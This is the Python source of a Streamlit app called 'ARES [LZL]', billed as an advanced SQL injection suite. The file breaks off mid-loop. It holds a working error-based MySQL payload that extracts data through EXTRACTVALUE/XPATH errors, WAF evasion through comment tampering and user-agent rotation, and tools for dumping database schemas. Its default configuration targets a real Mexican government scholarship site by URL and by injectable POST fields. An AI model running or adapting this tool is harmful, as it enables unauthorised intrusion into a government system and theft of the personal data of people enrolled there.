import streamlit as st
import requests
import random
import re
import binascii
import time
import json
import os
import sys
import unicodedata

# A√±adir carpeta local al path para importar m√≥dulos
sys.path.append(os.path.abspath("BUHO_RACIONAL_INJECCION"))
try:
    import inspector
    import buho_racional_dump
    import importlib
    importlib.reload(inspector)
    importlib.reload(buho_racional_dump)
    from inspector import MotorInyeccion
    from buho_racional_dump import BuhoRacionalDump
except ImportError:
    pass

# --- CONFIGURACI√ìN DE P√ÅGINA ---
st.set_page_config(
    page_title="SQL EXPLOIT ARES [LZL]",
    page_icon="ü¶â",
    layout="wide",
    initial_sidebar_state="expanded"
)

# --- ESTILOS CSS "ARES [LZL] THEME - CYBER MINIMALIST" ---
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;500;700&family=Fira+Code:wght@300;400;600&display=swap');
    
    /* --- VARIABLES --- */
    :root {
        --bg-color: #050505;
        --card-bg: #0a0a0a;
        --accent-color: #00ff41;
        --accent-glow: rgba(0, 255, 65, 0.2);
        --text-primary: #e0e0e0;
        --text-secondary: #a0a0a0;
        --font-head: 'Rajdhani', sans-serif;
        --font-mono: 'Fira Code', monospace;
    }

    /* --- BASE RESET --- */
    html, body, [class*="css"] {
        font-family: var(--font-head);
        background-color: var(--bg-color);
        color: var(--text-primary);
        font-weight: 500;
    }
    
    /* --- TYPOGRAPHY --- */
    h1, h2, h3, h4, h5, h6 {
        font-family: var(--font-head);
        text-transform: uppercase;
        letter-spacing: 2px;
        color: var(--accent-color);
        text-shadow: 0 0 10px var(--accent-glow);
    }
    
    .stCode, .stCodeBlock, pre, code {
        font-family: var(--font-mono) !important;
    }

    /* --- SIDEBAR --- */
    [data-testid="stSidebar"] {
        background-color: var(--card-bg);
        border-right: 1px solid #1a1a1a;
        box-shadow: 5px 0 20px rgba(0,0,0,0.5);
    }

    /* --- INPUTS & WIDGETS --- */
    .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div>div {
        background-color: #0f0f0f;
        color: var(--accent-color);
        border: 1px solid #333;
        border-radius: 4px;
        font-family: var(--font-mono);
        transition: all 0.3s ease;
    }
    .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus {
        border-color: var(--accent-color);
        box-shadow: 0 0 15px var(--accent-glow);
        background-color: #000;
    }

    /* --- BUTTONS (CYBER STYLE) --- */
    .stButton>button {
        background: transparent;
        color: var(--accent-color);
        border: 1px solid var(--accent-color);
        border-radius: 2px;
        padding: 0.5rem 1rem;
        font-family: var(--font-head);
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 3px;
        position: relative;
        overflow: hidden;
        transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        width: 100%;
    }
    
    .stButton>button::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
        transition: all 0.5s;
        opacity: 0.3;
    }

    .stButton>button:hover {
        background-color: var(--accent-color);
        color: #000;
        box-shadow: 0 0 20px var(--accent-color);
        transform: translateY(-2px);
    }
    
    .stButton>button:hover::before {
        left: 100%;
    }
    
    .stButton>button:active {
        transform: scale(0.98);
    }

    /* --- TABS --- */
    .stTabs [data-baseweb="tab-list"] {
        gap: 20px;
        border-bottom: 1px solid #333;
    }
    .stTabs [data-baseweb="tab"] {
        height: 50px;
        white-space: pre-wrap;
        background-color: transparent;
        border-radius: 4px 4px 0 0;
        color: var(--text-secondary);
        font-family: var(--font-head);
        font-size: 1.2rem;
        font-weight: 700;
        transition: all 0.3s;
    }
    .stTabs [aria-selected="true"] {
        background-color: rgba(0, 255, 65, 0.05);
        color: var(--accent-color);
        border-bottom: 2px solid var(--accent-color);
    }

    /* --- CARDS / CONTAINERS --- */
    div[data-testid="stExpander"] {
        background-color: var(--card-bg);
        border: 1px solid #222;
        border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0,0,0,0.3);
    }
    
    /* --- ANIMATIONS --- */
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }
    
    .element-container {
        animation: fadeIn 0.5s ease-out forwards;
    }
    
    /* --- LOGO STYLES --- */
    .ares-header {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 3rem 0;
        background: radial-gradient(circle at center, #111 0%, #000 70%);
        border-bottom: 1px solid #222;
        margin-bottom: 2rem;
        position: relative;
    }
    
    .ares-logo-img {
        width: 120px;
        height: 120px;
        border-radius: 50%;
        border: 2px solid var(--accent-color);
        box-shadow: 0 0 30px var(--accent-glow);
        margin-bottom: 1rem;
        transition: transform 0.5s;
    }
    
    .ares-logo-img:hover {
        transform: rotate(360deg) scale(1.1);
    }
    
    .ares-title {
        font-size: 4rem;
        font-weight: 700;
        letter-spacing: 10px;
        color: #fff;
        text-shadow: 0 0 10px var(--accent-color);
        background: linear-gradient(90deg, #fff, var(--accent-color), #fff);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-size: 200% auto;
        animation: shine 3s linear infinite;
    }
    
    @keyframes shine {
        to {
            background-position: 200% center;
        }
    }
    
    /* --- METRICS --- */
    div[data-testid="stMetricValue"] {
        font-family: var(--font-mono);
        color: var(--accent-color);
        font-size: 3rem;
    }
    
    /* --- TOAST --- */
    div[data-testid="stToast"] {
        background-color: #111;
        border: 1px solid var(--accent-color);
        color: #fff;
    }

</style>
""", unsafe_allow_html=True)

# --- HEADER ---
# Cargar Logo desde Base64 (si existe archivo generado)
try:
    with open("logo_b64.txt", "r") as f:
        B64_LOGO = f.read().strip()
    LOGO_HTML = f'<img src="data:image/jpeg;base64,{B64_LOGO}" class="ares-logo-img">'
except:
    LOGO_HTML = '<div class="ares-logo" style="font-size: 5rem;">ü¶â</div>'

st.markdown(f"""
<div class="ares-header">
    {LOGO_HTML}
    <div class="ares-title">ARES [LZL]</div>
    <div style="color: #666; letter-spacing: 3px; font-family: 'Fira Code'; font-size: 0.9rem; margin-top: 10px;">ADVANCED SQL INJECTION SUITE</div>
</div>
""", unsafe_allow_html=True)


# --- UTILS ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

def get_random_agent():
    return random.choice(USER_AGENTS)

def string_to_hex(s):
    return "0x" + binascii.hexlify(s.encode()).decode()

def tamper(payload, method="space2comment"):
    if method == "space2comment":
        return payload.replace(" ", "/**/")
    return payload

def repair_mojibake(text):
    """
    Intenta reparar doble/triple encoding (Mojibake) recursivamente.
    Soporta Latin1 y CP1252 (com√∫n en Windows).
    Ejemplo: '√É∆í√Ç¬°' -> '√É¬°' -> '√°'
    """
    if not text or not isinstance(text, str):
        return text
        
    current_text = text
    # Intentamos hasta 3 niveles de profundidad
    for _ in range(3):
        improved = False
        # Probamos CP1252 primero (m√°s com√∫n para caracteres como ∆í, ‚Ç¨, etc.)
        # y luego Latin1 como fallback.
        for enc in ['cp1252', 'latin1']:
            try:
                # Intentamos revertir la interpretaci√≥n err√≥nea
                fixed = current_text.encode(enc).decode('utf-8')
                
                # Heur√≠stica: Si la longitud disminuye, es muy probable que sea un fix
                if len(fixed) < len(current_text):
                    current_text = fixed
                    improved = True
                    break # Pasamos al siguiente nivel de profundidad con el texto arreglado
            except (UnicodeEncodeError, UnicodeDecodeError):
                continue
        
        if not improved:
            break
            
    return current_text

def smart_decode(hex_str, col_name=None):
    """Decodifica inteligentemente valores HEX a string, manejando binarios y mojibake."""
    if not hex_str: return ""
    
    # Intento 0: Si es longitud impar, probablemente es un valor num√©rico HEX o truncado
    if len(hex_str) % 2 != 0:
        return f"0x{hex_str}"

    try:
        bytes_val = binascii.unhexlify(hex_str)
    except:
        return f"ERR:{hex_str[:10]}"

    # Heur√≠stica 1: Columnas sospechosas de ser binarias
    is_suspect_col = False
    if col_name:
        lower_col = col_name.lower()
        # Palabras clave que sugieren contenido binario o hashes
        if any(x in lower_col for x in ['uid', 'uuid', 'guid', 'hash', 'salt', 'key', 'bin', 'auth', 'pass', 'token']):
            is_suspect_col = True

    # Intento 1: UTF-8
    try:
        decoded_utf8 = bytes_val.decode('utf-8')
        
        # Chequear caracteres de control (excluyendo formato com√∫n)
        control_chars = sum(1 for c in decoded_utf8 if unicodedata.category(c) == 'Cc' and c not in '\r\n\t')
        
        # Si tiene caracteres de control y es columna sospechosa -> HEX
        if control_chars > 0 and is_suspect_col:
             return f"0x{hex_str}"
        
        # Si tiene DEMASIADOS caracteres de control, es binario casi seguro
        if len(decoded_utf8) > 0 and (control_chars / len(decoded_utf8)) > 0.1: # 10% control chars limit
             return f"0x{hex_str}"

        # FIX MOJIBAKE
        return repair_mojibake(decoded_utf8)
    except UnicodeDecodeError:
        pass
    
    # Intento 2: Latin1 (siempre decodifica, pero chequeamos "printability")
    decoded_latin = bytes_val.decode('latin1', errors='replace')
    printable = sum(1 for c in decoded_latin if c.isprintable() or c in '\r\n\t')
    
    # Si la proporci√≥n de caracteres imprimibles es baja, es binario
    if len(decoded_latin) > 0 and (printable / len(decoded_latin)) < 0.85:
         return f"0x{hex_str}"
    
    # Si es columna sospechosa y llegamos a latin1 (fall√≥ utf-8), probablemente sea binario
    if is_suspect_col:
         return f"0x{hex_str}"

    # FIX MOJIBAKE ALSO HERE (Sometimes Latin1 decode results in mojibake if it was utf8 interpreted as latin1)
    return repair_mojibake(decoded_latin)

def parse_raw_request(raw_text):
    """Parsea una petici√≥n HTTP raw para extraer URL, headers, cookies y data."""
    try:
        lines = raw_text.strip().split('\n')
        if not lines: return None
        
        # Request Line
        req_line = lines[0].split()
        method = req_line[0]
        path = req_line[1]
        
        headers = {}
        cookies = ""
        body = ""
        host = ""
        
        i = 1
        while i < len(lines):
            line = lines[i].strip()
            if not line: # Empty line separates headers from body
                body = "\n".join(lines[i+1:]).strip()
                break
            
            if ':' in line:
                key, value = line.split(':', 1)
                key = key.strip()
                value = value.strip()
                headers[key] = value
                
                if key.lower() == 'host':
                    host = value
                if key.lower() == 'cookie':
                    cookies = value
            i += 1
            
        url = f"https://{host}{path}" # Asumimos HTTPS por defecto
        
        # Extraer referer si existe
        referer = headers.get('Referer', url)
        
        return {
            "url": url,
            "host": host,
            "cookies": cookies,
            "referer": referer,
            "body": body,
            "method": method
        }
    except Exception as e:
        st.error(f"Error parsing Raw Request: {e}")
        return None

def make_request(sql_query, config, is_count=False):
    # Construct payload
    # 0x7e is '~'
    payload_marker = f"022 AND EXTRACTVALUE(1,CONCAT(0x7e,({sql_query}),0x7e))--"
    
    # Tamper
    injection = tamper(payload_marker, config.get('tamper', 'space2comment'))
    
    headers = {
        "Host": config['host'],
        "Cookie": config['cookies'],
        "User-Agent": config['user_agent'] if config['user_agent'] != "Random" else get_random_agent(),
        "Accept": "text/html, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"https://{config['host']}",
        "Referer": config['referer']
    }
    
    data = {
        "caso": "6",
        "municipio": injection,
        "selected": "62123",
        "estado": "14"
    }
    
    try:
        time.sleep(config['delay'])
        response = requests.post(config['url'], headers=headers, data=data, timeout=10)
        
        # Detectar XPATH syntax error
        # El error suele ser: XPATH syntax error: '~RESULTADO~'
        # Si el resultado es muy largo, MySQL lo trunca.
        # En versiones viejas el truncado es simple, en nuevas a veces no muestra el cierre '~'
        
        match = re.search(r"XPATH syntax error: '~(.*?)~'", response.text)
        if match:
            return match.group(1), False # Data, Truncated? (Si tiene cierre '~', asumimos no truncado por ahora, o al menos completo en formato)
        
        # Caso: Truncamiento severo donde no aparece el segundo '~'
        match_partial = re.search(r"XPATH syntax error: '~(.*)", response.text)
        if match_partial:
             # Si no hay cierre, es truncado seguro.
             val = match_partial.group(1)
             # Limpiar basura final si la hay (a veces comillas sueltas)
             val = val.split("'")[0] 
             return val, True

        return None, False
    except Exception as e:
        return None, False

class SmartExtractor:
    pass  # Deprecated: Replaced by BuhoRacionalDump



# --- SESSION MANAGEMENT ---
SESSIONS_DIR = "sessions"
DEFAULT_SESSION = "ares_session.json"
CACHE_FILE = "ares_schema_cache.json"

# Ensure sessions directory exists
if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

def list_sessions():
    """List all JSON session files in the sessions directory."""
    try:
        files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.json')]
        return files
    except Exception:
        return []

def save_session(config, filename=None):
    if not filename:
        filename = DEFAULT_SESSION
    
    if not filename.endswith('.json'):
        filename += '.json'
        
    filepath = os.path.join(SESSIONS_DIR, filename)
    
    try:
        with open(filepath, 'w') as f:
            json.dump(config, f, indent=4)
        st.toast(f"Session Saved [{filename}]", icon="üíæ")
        return True
    except Exception as e:
        st.error(f"Failed to save session: {e}")
        return False

def load_session(filename=None):
    if not filename:
        filename = DEFAULT_SESSION
        
    filepath = os.path.join(SESSIONS_DIR, filename)
    
    # Fallback to root directory for backward compatibility
    if not os.path.exists(filepath) and filename == DEFAULT_SESSION:
        if os.path.exists(DEFAULT_SESSION):
            filepath = DEFAULT_SESSION

    if os.path.exists(filepath):
        try:
            with open(filepath, 'r') as f:
                return json.load(f)
        except:
            return None
    return None

def save_cache(cache):
    try:
        with open(CACHE_FILE, 'w') as f:
            json.dump(cache, f)
    except: pass

def load_cache():
    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE, 'r') as f:
                return json.load(f)
        except: return None
    return None

# --- APP LOGIC ---

# 1. Initialize State
if 'config' not in st.session_state:
    loaded = load_session()
    if loaded:
        st.session_state.config = loaded
        st.session_state.current_session = DEFAULT_SESSION
        st.toast("Default Session Loaded", icon="ü¶â")
    else:
        # Default config
        st.session_state.current_session = None
        st.session_state.config = {
            "url": "https://subes.becasbenitojuarez.gob.mx/class/perfil/selects.php",
            "host": "subes.becasbenitojuarez.gob.mx",
            "cookies": "",
            "referer": "",
            "user_agent": "Random",
            "tamper": "space2comment",
            "delay": 1.0,
            "raw_input": "",
            "method": "POST",
            "post_data": {
                "caso": "6",
                "municipio": "022",
                "selected": "62123",
                "estado": "14"
            }
        }

# Initialize Schema Cache
if 'schema_cache' not in st.session_state:
    c = load_cache()
    if c:
        st.session_state.schema_cache = c
        st.toast("Schema Cache Loaded", icon="üóÑÔ∏è")
    else:
        st.session_state.schema_cache = {'dbs': [], 'tables': {}, 'columns': {}}

if 'dbs' not in st.session_state: 
    # Load from cache if available
    if st.session_state.schema_cache['dbs']:
        st.session_state.dbs = st.session_state.schema_cache['dbs']
    else:
        st.session_state.dbs = []

if 'db_count' not in st.session_state: st.session_state.db_count = len(st.session_state.dbs)
if 'logs' not in st.session_state: st.session_state.logs = []
if 'inspection_result' not in st.session_state: st.session_state.inspection_result = None

# --- LAYOUT ---
# Tabs Reorganizados
tab_api, tab_inspect, tab_access = st.tabs(["üîå API EXPLOIT", "üïµÔ∏è INSPECCI√ìN", "üóÑÔ∏è ACCESS DEEP"])

# --- TAB 1: API EXPLOIT ---
with tab_api:
    # --- SESSION MANAGER ---
    with st.expander("üíæ SAVE CONFIGURATION", expanded=False):
        st.markdown(f"**Current Session:** `{st.session_state.get('current_session', 'Unsaved')}`")
        
        st.markdown('<div class="inspect-label">SAVE SESSION AS</div>', unsafe_allow_html=True)
        c_save1, c_save2 = st.columns([3, 1])
        with c_save1:
            new_session_name = st.text_input("Filename (e.g. site_juarez)", placeholder="site_name", label_visibility="collapsed")
        with c_save2:
            if st.button("üíæ SAVE", use_container_width=True):
                target_name = new_session_name if new_session_name else st.session_state.get('current_session', 'ares_session')
                if save_session(st.session_state.config, target_name):
                    st.session_state.current_session = target_name if target_name.endswith('.json') else target_name + '.json'
                    st.rerun()

    st.markdown("---")

    st.markdown("### üîå CONFIGURACI√ìN DE OBJETIVO")
    
    # Selector de Modo con estilo
    modo_input = st.radio("MODO DE ENTRADA", ["RAW REQUEST", "POST FORM", "URL PARAM"], horizontal=True)

    st.markdown("---")

    if modo_input == "RAW REQUEST":
        st.markdown('<div class="inspect-label">RAW HTTP REQUEST</div>', unsafe_allow_html=True)
        raw_text = st.text_area("Paste Raw Request Here", height=300, value=st.session_state.config.get("raw_input", ""), placeholder="POST /path HTTP/1.1\nHost: example.com\n...")
        
        if st.button("‚ö° PARSE & LOAD RAW"):
            parsed = parse_raw_request(raw_text)
            if parsed:
                # Intentar parsear body si es x-www-form-urlencoded simple
                post_data_parsed = {}
                if parsed['body']:
                    try:
                        pairs = parsed['body'].split('&')
                        for p in pairs:
                            if '=' in p:
                                k, v = p.split('=', 1)
                                post_data_parsed[k] = v
                    except:
                        pass
                
                final_post_data = post_data_parsed if post_data_parsed else st.session_state.config.get("post_data", {})

                st.session_state.config.update({
                    "url": parsed['url'],
                    "host": parsed['host'],
                    "cookies": parsed['cookies'],
                    "referer": parsed['referer'],
                    "raw_input": raw_text,
                    "method": parsed['method'],
                    "post_data": final_post_data
                })
                save_session(st.session_state.config, st.session_state.get('current_session'))
                st.toast("Request Parsed Successfully!", icon="‚úÖ")
                time.sleep(0.5)
                st.rerun()

    elif modo_input == "POST FORM":
        c1, c2 = st.columns(2, gap="large")
        with c1:
            st.markdown('<div class="inspect-label">TARGET SETTINGS</div>', unsafe_allow_html=True)
            st.session_state.config['url'] = st.text_input("Target URL", st.session_state.config['url'])
            st.session_state.config['host'] = st.text_input("Host Header", st.session_state.config['host'])
            st.session_state.config['referer'] = st.text_input("Referer Header", st.session_state.config.get('referer', ''))
            
        with c2:
            st.markdown('<div class="inspect-label">AUTHENTICATION</div>', unsafe_allow_html=True)
            st.session_state.config['cookies'] = st.text_area("Cookies", st.session_state.config['cookies'], height=150)
            
        st.markdown('<div class="inspect-label" style="margin-top:20px;">POST PARAMETERS (JSON EDITOR)</div>', unsafe_allow_html=True)
        # Editor JSON para params
        params_str = st.text_area("Body Params", value=json.dumps(st.session_state.config.get('post_data', {}), indent=4), height=200)
        try:
            st.session_state.config['post_data'] = json.loads(params_str)
        except:
            st.error("Invalid JSON format for parameters")

    elif modo_input == "URL PARAM":
        st.info("Modo simplificado: Se asume inyecci√≥n en Query Params (GET)")
        full_url = st.text_input("Full URL (e.g. http://site.com/vuln.php?id=1)", value=st.session_state.config['url'])
        st.session_state.config['url'] = full_url.split('?')[0]
        # Parse params simple
        if '?' in full_url:
            pass # L√≥gica futura para params GET

    st.markdown("---")
    st.markdown("#### üõ°Ô∏è EVASION & ADVANCED OPTIONS")
    
    with st.expander("CONFIGURE EVASION PROFILE", expanded=True):
        ec1, ec2, ec3 = st.columns(3)
        with ec1:
            st.markdown('<div class="inspect-label">USER AGENT</div>', unsafe_allow_html=True)
            st.session_state.config['user_agent'] = st.selectbox("Select Agent", ["Random", "Custom"], index=0 if st.session_state.config['user_agent']=="Random" else 1, label_visibility="collapsed")
            if st.session_state.config['user_agent'] == "Custom":
                st.session_state.config['custom_ua_str'] = st.text_input("Custom UA String", st.session_state.config.get('custom_ua_str', ''))
                
        with ec2:
            st.markdown('<div class="inspect-label">TAMPER SCRIPT</div>', unsafe_allow_html=True)
            st.session_state.config['tamper'] = st.selectbox("Select Tamper", ["space2comment", "none", "between", "randomcase"], index=0 if st.session_state.config['tamper']=="space2comment" else 1, label_visibility="collapsed")
            
        with ec3:
            st.markdown('<div class="inspect-label">REQUEST DELAY (SEC)</div>', unsafe_allow_html=True)
            st.session_state.config['delay'] = st.slider("Delay", 0.0, 10.0, st.session_state.config['delay'], label_visibility="collapsed")

        # Opciones Extra
        ac1, ac2 = st.columns(2)
        with ac1:
            st.checkbox("Follow Redirects", value=True, key="opt_redirects")
        with ac2:
            st.number_input("Timeout (sec)", 1, 60, 10, key="opt_timeout")

    # --- PAYLOAD LOGGER ---
    st.markdown("---")
    with st.expander("üì° PAYLOAD LOGS (LAST 10)", expanded=False):
        if st.button("üóëÔ∏è CLEAR LOGS"):
            st.session_state.logs = []
            st.rerun()
            
        if st.session_state.get('logs'):
            for i, log in enumerate(reversed(st.session_state.logs[-10:])):
                st.text_area(f"Payload #{len(st.session_state.logs)-i}", value=log, height=70, key=f"log_{i}")
        else:
            st.info("No payloads logged yet.")

# --- TAB 2: INSPECCI√ìN ---
with tab_inspect:
    # --- TARGET SESSION SELECTOR ---
    st.markdown("### üìÇ SELECCIONAR OBJETIVO (SESSION)")
    
    sessions_list = list_sessions()
    if sessions_list:
        # Layout: Selector | Load Button | Active Info
        col_s1, col_s2 = st.columns([3, 1])
        with col_s1:
            # Find index of current session if possible
            try:
                curr_idx = sessions_list.index(st.session_state.get('current_session', ''))
            except:
                curr_idx = 0
                
            selected_session = st.selectbox("Available Sessions", sessions_list, index=curr_idx, label_visibility="collapsed")
        
        with col_s2:
            if st.button("üöÄ LOAD TARGET", use_container_width=True):
                loaded_config = load_session(selected_session)
                if loaded_config:
                    st.session_state.config = loaded_config
                    st.session_state.current_session = selected_session
                    
                    # Reset inspection results when changing target
                    st.session_state.inspection_result = None
                    st.session_state.dbs = []
                    st.session_state.tables = []
                    st.session_state.columns = []
                    
                    st.toast(f"Target Loaded: {selected_session}", icon="üéØ")
                    time.sleep(0.5)
                    st.rerun()
    else:
        st.info("‚ö†Ô∏è No sessions found. Go to 'API EXPLOIT' to configure and save a target.")
        
    st.markdown("---")

    st.markdown("### üïµÔ∏è BUHO RACIONAL: INSPECTOR DE INYECCI√ìN")
    
    # CSS espec√≠fico para tarjetas de inspecci√≥n
    st.markdown("""
    <style>
    .inspect-card {
        background-color: rgba(255, 255, 255, 0.03);
        border: 1px solid #333;
        border-radius: 6px;
        padding: 1.5rem;
        margin-bottom: 1rem;
        transition: all 0.3s ease;
    }
    .inspect-card:hover {
        border-color: var(--accent-color);
        box-shadow: 0 0 15px rgba(0, 255, 65, 0.1);
    }
    .inspect-label {
        color: var(--text-secondary);
        font-size: 0.8rem;
        text-transform: uppercase;
        letter-spacing: 1.5px;
        margin-bottom: 0.5rem;
    }
    .inspect-value {
        color: #fff;
        font-family: var(--font-mono);
        font-size: 1.1rem;
        word-break: break-all;
    }
    .status-badge {
        display: inline-block;
        padding: 0.25rem 0.75rem;
        border-radius: 4px;
        font-weight: bold;
        font-size: 0.9rem;
        letter-spacing: 1px;
    }
    .status-vuln {
        background-color: rgba(0, 255, 65, 0.1);
        color: #00ff41;
        border: 1px solid #00ff41;
    }
    .status-safe {
        background-color: rgba(255, 75, 75, 0.1);
        color: #ff4b4b;
        border: 1px solid #ff4b4b;
    }
    </style>
    """, unsafe_allow_html=True)

    col_ctrl, col_res = st.columns([1, 2], gap="large")
    
    with col_ctrl:
        st.markdown('<div class="inspect-card">', unsafe_allow_html=True)
        st.markdown("#### ‚öôÔ∏è CONTROLES")
        
        # Resumen Visual
        st.markdown(f"""
        <div style="margin-bottom: 15px;">
            <div class="inspect-label">TARGET</div>
            <div class="inspect-value" style="color: var(--accent-color);">{st.session_state.config['host']}</div>
        </div>
        <div style="margin-bottom: 15px;">
            <div class="inspect-label">STRATEGY</div>
            <div class="inspect-value">{st.session_state.config.get('method', 'POST')} | {st.session_state.config['tamper']}</div>
        </div>
        """, unsafe_allow_html=True)
        
        # Selector de Modo de Ataque (Manual/Auto)
        st.markdown('<div class="inspect-label">DETECTION MODE</div>', unsafe_allow_html=True)
        mode_detect = st.selectbox("Detection Mode", ["Auto-Detect (Recommended)", "Force Error-Based", "Force Union-Based"], label_visibility="collapsed")
        
        # Explicit Parameter Target (Optional)
        st.markdown('<div class="inspect-label" style="margin-top:10px;">TARGET PARAMETER (OPTIONAL)</div>', unsafe_allow_html=True)
        target_param_manual = st.text_input("Param Name", placeholder="e.g. id, search, etc.", label_visibility="collapsed")
        
        if st.button("üöÄ EJECUTAR AN√ÅLISIS"):
            with st.status("Analizando objetivo...", expanded=True) as status:
                try:
                    start_time = time.time()
                    
                    # Callback para logs en tiempo real
                    def inspection_callback(type, msg):
                        if type == "PAYLOAD":
                            status.write(f"üöÄ {msg}")
                        elif type == "INFO":
                            status.write(f"‚ÑπÔ∏è {msg}")
                        elif type == "ERROR":
                            status.write(f"‚ùå {msg}")
                        # Debug ignorado para limpieza
                    
                    # Configurar modo forzado si aplica
                    config_scan = st.session_state.config.copy()
                    if mode_detect == "Force Error-Based": config_scan['force_mode'] = 'error'
                    if mode_detect == "Force Union-Based": config_scan['force_mode'] = 'union'
                    
                    # Si el usuario especific√≥ un par√°metro, lo pasamos en config
                    if target_param_manual:
                         config_scan['target_param'] = target_param_manual.strip()
                    
                    inspector = MotorInyeccion(config_scan, callback=inspection_callback)
                    resultado = inspector.inspeccionar()
                    elapsed = time.time() - start_time
                    resultado['latency'] = round(elapsed, 2)
                    
                    st.session_state.inspection_result = resultado
                    
                    if resultado['vulnerable']:
                        status.update(label="¬°VULNERABILIDAD CONFIRMADA!", state="complete", expanded=False)
                        
                        # --- AUTO-SAVE EXPLOIT CONTEXT TO SESSION ---
                        # Determine Injection Type
                        inj_type = "error"
                        if resultado.get('union_columns'):
                            inj_type = "union"
                        elif "XPATH" in resultado.get('error_detectado', ''):
                            inj_type = "error"
                            
                        # Update Config
                        st.session_state.config['injection_type'] = inj_type
                        st.session_state.config['parametro_vulnerable'] = resultado.get('parametro_vulnerable')
                        st.session_state.config['dbms'] = resultado.get('dbms')
                        st.session_state.config['db_version'] = resultado.get('version')
                        
                        # Save Union Context if available
                        if inj_type == "union":
                            st.session_state.config['union_visible_idx'] = resultado.get('union_visible_idx')
                            st.session_state.config['union_columns'] = resultado.get('union_columns')
                        
                        # Persist to Disk
                        save_session(st.session_state.config, st.session_state.get('current_session'))
                        # --------------------------------------------
                        
                    else:
                        status.update(label="No se detect√≥ vulnerabilidad.", state="error", expanded=False)
                except Exception as e:
                    st.error(f"Error cr√≠tico: {e}")
                    status.update(label="Error interno", state="error")
        
        st.markdown("---")
        if st.button("üóëÔ∏è BORRAR SESI√ìN Y CACH√â", type="secondary"):
            st.session_state.inspection_result = None
            st.session_state.dbs = []
            st.session_state.tables = []
            st.session_state.columns = []
            st.session_state.schema_cache = {'dbs': [], 'tables': {}, 'columns': {}}
            
            # Remove Current Session File
            curr_sess = st.session_state.get('current_session')
            if curr_sess:
                # Try sessions dir
                p1 = os.path.join(SESSIONS_DIR, curr_sess)
                if os.path.exists(p1):
                    os.remove(p1)
                # Try root (legacy)
                elif os.path.exists(curr_sess):
                    os.remove(curr_sess)

            if os.path.exists(CACHE_FILE):
                os.remove(CACHE_FILE)
                
            st.toast("Sesi√≥n y Cach√© eliminados. Reiniciando...", icon="üßπ")
            time.sleep(1)
            st.rerun()
            
        st.markdown('</div>', unsafe_allow_html=True)

    with col_res:
        if st.session_state.inspection_result:
            res = st.session_state.inspection_result
            
            if res['vulnerable']:
                # Header de √âxito
                st.markdown("""
                <div class="inspect-card" style="border-color: #00ff41; background: linear-gradient(45deg, rgba(0,255,65,0.05), transparent);">
                    <h3 style="margin:0; display:flex; align-items:center;">
                        <span style="font-size:1.5em; margin-right:10px;">üîì</span> 
                        VULNERABILITY DETECTED
                    </h3>
                </div>
                """, unsafe_allow_html=True)
                
                # M√©tricas Clave
                m1, m2, m3 = st.columns(3)
                with m1:
                    st.markdown(f"""
                    <div class="inspect-card" style="text-align:center; padding: 1rem;">
                        <div class="inspect-label">DBMS</div>
                        <div class="inspect-value" style="font-size: 1.5rem;">{res.get('dbms', 'Unknown')}</div>
                    </div>
                    """, unsafe_allow_html=True)
                with m2:
                    st.markdown(f"""
                    <div class="inspect-card" style="text-align:center; padding: 1rem;">
                        <div class="inspect-label">VECTOR</div>
                        <div class="inspect-value" style="font-size: 1.5rem;">{res.get('parametro_vulnerable', '?')}</div>
                    </div>
                    """, unsafe_allow_html=True)
                with m3:
                    st.markdown(f"""
                    <div class="inspect-card" style="text-align:center; padding: 1rem;">
                        <div class="inspect-label">LATENCY</div>
                        <div class="inspect-value" style="font-size: 1.5rem;">{res.get('latency', '0.0')}s</div>
                    </div>
                    """, unsafe_allow_html=True)

                if res.get('union_columns'):
                     st.markdown(f"""
                    <div class="inspect-card" style="border-color: #00ff41; background: linear-gradient(45deg, rgba(0,255,65,0.05), transparent);">
                        <h3 style="margin:0; display:flex; align-items:center;">
                            <span style="font-size:1.5em; margin-right:10px;">üëë</span> 
                            UNION-BASED INJECTION AVAILABLE
                        </h3>
                        <p style="margin-top:10px; color:#ccc;">
                            Massive dumping capability unlocked.<br>
                            Columns: {res.get('union_columns')} | Visible: #{res.get('union_visible_idx')}
                        </p>
                    </div>
                    """, unsafe_allow_html=True)

                # Detalle T√©cnico Minimalista
                st.markdown('<div class="inspect-card">', unsafe_allow_html=True)
                st.markdown('<div class="inspect-label">DATABASE VERSION</div>', unsafe_allow_html=True)
                st.code(res.get('version', 'N/A'), language="sql")
                
                st.markdown('<div class="inspect-label" style="margin-top: 15px;">ERROR FINGERPRINT</div>', unsafe_allow_html=True)
                st.code(res.get('error_detectado', 'N/A'), language="text")
                st.markdown('</div>', unsafe_allow_html=True)
                
            else:
                # Estado No Vulnerable
                st.markdown("""
                <div class="inspect-card" style="border-color: #ff4b4b; background: linear-gradient(45deg, rgba(255,75,75,0.05), transparent); text-align: center; padding: 3rem;">
                    <h3 style="color: #ff4b4b; margin-bottom: 1rem;">üõ°Ô∏è TARGET SEEMS SECURE</h3>
                    <p style="color: #888;">No injection vectors confirmed with current configuration.</p>
                </div>
                """, unsafe_allow_html=True)
                
                with st.expander("Ver Logs de Intento"):
                    for det in res['detalles']:
